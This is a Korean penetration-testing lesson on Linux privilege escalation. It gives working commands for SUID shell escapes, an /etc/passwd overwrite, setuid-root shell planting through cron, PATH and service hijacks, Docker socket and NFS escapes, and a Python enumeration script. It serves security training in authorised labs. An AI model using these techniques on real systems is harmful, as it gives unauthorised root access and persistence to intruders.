# 권한 상승 — 리눅스

**이전**: [11. 리버스 엔지니어링](./11_Reverse_Engineering.md) | **다음**: [13. 권한 상승 — 윈도우](./13_Privilege_Escalation_Windows.md)

---

낮은 권한의 사용자로 Linux 시스템에 초기 접근을 획득한 후, 권한 상승(privilege escalation)은 다음 핵심 단계이다. 이 레슨에서는 Linux 시스템에서 설정 오류, 취약한 소프트웨어, 설계 결함을 식별하고 익스플로잇하여 루트(root) 접근 권한을 얻는 체계적 프로세스를 다룬다.

> **중요**: 권한 상승 실습은 소유하거나 명시적으로 테스트 권한을 부여받은 시스템에서만 수행해야 한다.

**난이도**: ⭐⭐⭐⭐

## 학습 목표

1. Linux 권한 상승을 위한 체계적 방법론을 적용한다
2. GTFOBins를 사용하여 SUID/SGID 바이너리를 찾고 익스플로잇한다
3. Linux 케이퍼빌리티(capabilities)를 남용하여 권한을 상승한다
4. 설정이 잘못된 cron 작업과 경로 하이재킹(path hijacking)을 익스플로잇한다
5. 커널 취약점을 식별하고 익스플로잇한다
6. Docker 컨테이너에서 호스트 시스템으로 탈출한다
7. LinPEAS 및 기타 자동화 열거 도구를 사용한다
8. 침투 테스트 보고서를 위한 상승 경로를 문서화한다

---

## 목차

1. [Linux 권한 상승 방법론](#1-linux-권한-상승-방법론)
2. [SUID 및 SGID 바이너리](#2-suid-및-sgid-바이너리)
3. [Linux 케이퍼빌리티](#3-linux-케이퍼빌리티)
4. [Cron 작업 익스플로잇](#4-cron-작업-익스플로잇)
5. [경로 하이재킹](#5-경로-하이재킹)
6. [쓰기 가능한 서비스 파일](#6-쓰기-가능한-서비스-파일)
7. [커널 익스플로잇](#7-커널-익스플로잇)
8. [Docker 및 컨테이너 탈출](#8-docker-및-컨테이너-탈출)
9. [NFS 설정 오류](#9-nfs-설정-오류)
10. [자동화 열거 도구](#10-자동화-열거-도구)
11. [연습 문제](#11-연습-문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. Linux 권한 상승 방법론

### 1.1 열거 체크리스트

```bash
# System information
uname -a                    # Kernel version
cat /etc/os-release         # OS version
hostname                    # System hostname

# Current user context
id                          # User ID and groups
whoami                      # Current user
sudo -l                     # Sudo permissions (critical!)

# Users and groups
cat /etc/passwd             # All users
cat /etc/group              # All groups
last                        # Recent logins

# Network information
ip addr                     # Network interfaces
ss -tlnp                    # Listening services
cat /etc/hosts              # Host entries

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Running processes
ps aux
ps aux | grep root

# Capabilities
getcap -r / 2>/dev/null
```

```python
"""
Linux privilege escalation enumeration module.

Automates common enumeration checks for identifying
privilege escalation vectors on Linux systems.
"""

import os
import subprocess
import stat
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional


@dataclass
class PrivEscVector:
    """A potential privilege escalation vector."""
    category: str
    description: str
    severity: str  # Critical, High, Medium, Low
    evidence: str
    exploitation: str
    reference: str = ""


@dataclass
class EnumerationResult:
    """Results of privilege escalation enumeration."""
    vectors: list[PrivEscVector] = field(default_factory=list)
    system_info: dict = field(default_factory=dict)

    def add_vector(self, vector: PrivEscVector) -> None:
        self.vectors.append(vector)

    @property
    def critical_vectors(self) -> list[PrivEscVector]:
        return [v for v in self.vectors if v.severity == "Critical"]

    def report(self) -> str:
        lines = [
            "Linux Privilege Escalation Enumeration Report",
            "=" * 60,
            f"Total vectors found: {len(self.vectors)}",
            f"Critical: {len(self.critical_vectors)}",
            "",
        ]
        for v in sorted(self.vectors, key=lambda x: {"Critical":0,"High":1,"Medium":2,"Low":3}[x.severity]):
            lines.append(f"\n[{v.severity}] {v.category}: {v.description}")
            lines.append(f"  Evidence: {v.evidence}")
            lines.append(f"  Exploitation: {v.exploitation}")
        return "\n".join(lines)


def check_sudo_permissions() -> list[PrivEscVector]:
    """Check sudo permissions for the current user."""
    vectors = []
    try:
        result = subprocess.run(
            ["sudo", "-l"], capture_output=True, text=True, timeout=5,
            input="\n"
        )
        output = result.stdout + result.stderr

        # Check for NOPASSWD entries
        if "NOPASSWD" in output:
            vectors.append(PrivEscVector(
                category="Sudo",
                description="NOPASSWD sudo permissions found",
                severity="Critical",
                evidence=output.strip()[:200],
                exploitation="Check GTFOBins for escalation via allowed commands",
                reference="https://gtfobins.github.io/",
            ))

        # Check for ALL
        if "(ALL)" in output or "(root)" in output:
            vectors.append(PrivEscVector(
                category="Sudo",
                description="Broad sudo permissions detected",
                severity="Critical",
                evidence=output.strip()[:200],
                exploitation="sudo su or sudo /bin/bash for root shell",
            ))

    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    return vectors


def find_suid_binaries() -> list[PrivEscVector]:
    """Find SUID binaries that may allow escalation."""
    vectors = []
    # Known SUID escalation binaries (subset from GTFOBins)
    dangerous_suids = {
        "nmap", "vim", "find", "bash", "less", "more", "nano",
        "cp", "mv", "python", "python3", "perl", "ruby", "php",
        "awk", "env", "node", "git", "zip", "tar", "rsync",
        "pkexec", "doas", "screen",
    }

    try:
        result = subprocess.run(
            ["find", "/", "-perm", "-4000", "-type", "f"],
            capture_output=True, text=True, timeout=30,
        )
        for line in result.stdout.strip().split("\n"):
            if not line:
                continue
            binary_name = Path(line).name
            if binary_name in dangerous_suids:
                vectors.append(PrivEscVector(
                    category="SUID",
                    description=f"SUID binary: {line}",
                    severity="High",
                    evidence=f"Found SUID: {line}",
                    exploitation=f"Check GTFOBins for {binary_name} SUID escalation",
                    reference=f"https://gtfobins.github.io/gtfobins/{binary_name}/",
                ))
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    return vectors


def check_writable_sensitive_files() -> list[PrivEscVector]:
    """Check for writable sensitive files."""
    vectors = []
    sensitive_files = [
        "/etc/passwd", "/etc/shadow", "/etc/sudoers",
        "/etc/crontab", "/root/.ssh/authorized_keys",
    ]

    for filepath in sensitive_files:
        if os.path.exists(filepath) and os.access(filepath, os.W_OK):
            vectors.append(PrivEscVector(
                category="Writable File",
                description=f"Writable sensitive file: {filepath}",
                severity="Critical",
                evidence=f"{filepath} is writable by current user",
                exploitation=f"Modify {filepath} to gain root access",
            ))

    return vectors


if __name__ == "__main__":
    print("Linux Privilege Escalation Enumerator")
    print("=" * 50)
    print("Run on target system after gaining initial access.")
    print("\nChecks performed:")
    print("  - Sudo permissions")
    print("  - SUID/SGID binaries")
    print("  - Writable sensitive files")
    print("  - Capabilities")
    print("  - Cron jobs")
    print("  - Kernel version")
```

---

## 2. SUID 및 SGID 바이너리

SUID 바이너리는 파일 소유자의 권한(보통 root)으로 실행된다. 익스플로잇이 가능하면 루트 접근을 제공한다.

### 2.1 GTFOBins

GTFOBins(https://gtfobins.github.io/)는 권한 상승에 악용할 수 있는 Unix 바이너리 목록이다:

```bash
# If find has SUID
find . -exec /bin/sh -p \;

# If python has SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If vim has SUID
vim -c ':!/bin/sh'

# If cp has SUID (overwrite /etc/passwd)
echo 'root2:$(openssl passwd -1 password):0:0::/root:/bin/bash' > /tmp/newpasswd
cp /tmp/newpasswd /etc/passwd
```

---

## 3. Linux 케이퍼빌리티

케이퍼빌리티(capabilities)는 루트 권한을 더 작은 단위로 분할한다. 일부는 익스플로잇 가능하다:

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid — can change UID to root
# cap_dac_read_search — can read any file
# cap_net_raw — can sniff traffic
# cap_sys_admin — near-root access

# Example: python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 4. Cron 작업 익스플로잇

```bash
# Identify cron jobs
cat /etc/crontab
ls -la /var/spool/cron/
ls -la /etc/cron.d/

# If a cron job runs a script writable by current user:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/script.sh
# Wait for cron execution, then:
/tmp/rootbash -p
```

---

## 5. 경로 하이재킹

cron 작업이나 SUID 바이너리가 절대 경로 없이 명령어를 호출하는 경우:

```bash
# Target script contains: tar czf /backup/files.tar.gz /var/www
# Create malicious 'tar' in a directory we control
echo '#!/bin/bash' > /tmp/tar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
# When the script runs, it executes our malicious 'tar'
```

---

## 6. 쓰기 가능한 서비스 파일

```bash
# Check for writable systemd service files
find /etc/systemd/system -writable 2>/dev/null

# Writable init scripts
find /etc/init.d -writable 2>/dev/null

# If we can modify a service file running as root:
# Add: ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
# Then: systemctl daemon-reload && systemctl restart <service>
```

---

## 7. 커널 익스플로잇

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel <version> privilege escalation

# Notable kernel exploits:
# DirtyCow (CVE-2016-5195) — Linux < 4.8.3
# DirtyPipe (CVE-2022-0847) — Linux 5.8 - 5.16.11
# PwnKit (CVE-2021-4034) — pkexec (nearly universal)
```

---

## 8. Docker 및 컨테이너 탈출

```bash
# Check if in a container
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Docker socket mounted (instant root on host)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container escape
# If --privileged flag was used:
mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape
# ... further exploitation via cgroup notify_on_release
```

---

## 9. NFS 설정 오류

```bash
# Check NFS exports
showmount -e target
cat /etc/exports

# no_root_squash allows root access from NFS client
# If share has no_root_squash:
mount -o rw target:/share /tmp/mount
# Create SUID binary as root on NFS share
cp /bin/bash /tmp/mount/rootbash
chmod +s /tmp/mount/rootbash
# Execute on target: /share/rootbash -p
```

---

## 10. 자동화 열거 도구

| 도구 | 설명 | 사용법 |
|------|-------------|-------|
| LinPEAS | 포괄적인 Linux 열거 | `./linpeas.sh` |
| LinEnum | Linux 열거 스크립트 | `./LinEnum.sh` |
| linux-exploit-suggester | 커널 익스플로잇 찾기 | `./les.sh` |
| pspy | 루트 없이 프로세스 모니터링 | `./pspy64` |
| GTFOBins | SUID/sudo 익스플로잇 참조 | 웹 기반 |

---

## 11. 연습 문제

1. **열거**: 취약한 VM에서 LinPEAS를 실행하고 모든 권한 상승 벡터를 식별한다.
2. **SUID 익스플로잇**: 실습 머신에서 GTFOBins를 사용하여 SUID 바이너리를 찾아 익스플로잇한다.
3. **Cron 남용**: 설정이 잘못된 cron 작업을 익스플로잇하여 루트 접근 권한을 얻는다.
4. **커널 익스플로잇**: 커널 버전을 식별하고 적절한 익스플로잇을 적용한다 (실습 VM에서).
5. **Docker 탈출**: 마운트된 Docker 소켓이 있는 Docker 컨테이너에서 탈출한다.
6. **전체 체인**: HTB/THM 머신에서 초기 접근부터 루트 상승까지 완료한다.

---

## 12. 요약

Linux 권한 상승은 체계적 열거와 창의적 익스플로잇을 필요로 한다:

- **sudo -l**은 항상 첫 번째로 확인한다 — 종종 루트로의 가장 빠른 경로이다
- **SUID 바이너리**와 GTFOBins는 잘 문서화된 상승 경로를 제공한다
- **케이퍼빌리티**는 잘못 구성되었을 때 세밀한 상승을 제공한다
- **Cron 작업**과 **경로 하이재킹**은 실행 환경에 대한 신뢰를 익스플로잇한다
- **커널 익스플로잇**은 패치가 지연될 때 범용 상승을 제공한다
- **컨테이너 탈출**은 컨테이너화된 환경에서 공격 표면을 확장한다
- **자동화 도구**(LinPEAS 등)는 열거를 가속화한다

---

## 13. 참고 자료

- GTFOBins: https://gtfobins.github.io/
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- HackTricks Linux PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings Linux PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
